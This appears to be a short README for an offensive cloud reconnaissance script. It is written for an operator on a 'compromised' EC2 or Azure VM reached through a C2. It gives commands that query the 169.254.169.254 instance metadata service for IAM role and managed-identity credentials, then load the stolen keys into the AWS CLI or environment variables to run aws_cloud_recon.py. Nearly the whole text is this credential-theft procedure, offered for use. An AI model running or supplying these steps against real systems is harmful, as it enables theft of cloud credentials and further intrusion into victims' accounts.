## 🔐 Step 1: Extract AWS Credentials from EC2 Instance
Run this in the compromised EC2 (PowerShell or cmd via your C2):

```
Invoke-RestMethod -Uri http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Then get the actual credentials:

```
Invoke-RestMethod -Uri http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
```

You’ll get output like:

```
{
  "AccessKeyId": "AKIA***********",
  "SecretAccessKey": "***************",
  "Token": "***************",
  "Expiration": "2025-06-14T14:00:00Z"
}
```
## Step 2: Use aws configure
Run this:

```
aws configure
```

It will ask:
```
AWS Access Key ID:     <your_access_key>
AWS Secret Access Key: <your_secret_key>
Default region name:   us-east-1 (or any region)
Default output format: json
```

Then run the script:

```
python3 aws_cloud_recon.py
```

## Step 2: Extract Azure Credentials

On Azure VM

```
Invoke-WebRequest -Headers @{"Metadata"="true"} -Uri "http://169.254.169.254/metadata/instance?api-version=2021-01-01"
```
Or in Linux:

```
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-01-01"
```

Export Credentials to Environment
In your terminal (replace placeholders with real values):

```
export AZURE_CLIENT_ID="xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
export AZURE_TENANT_ID="xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
export AZURE_CLIENT_SECRET="your-client-secret-here"
```

To make it permanent, add to ~/.bashrc or ~/.zshrc.
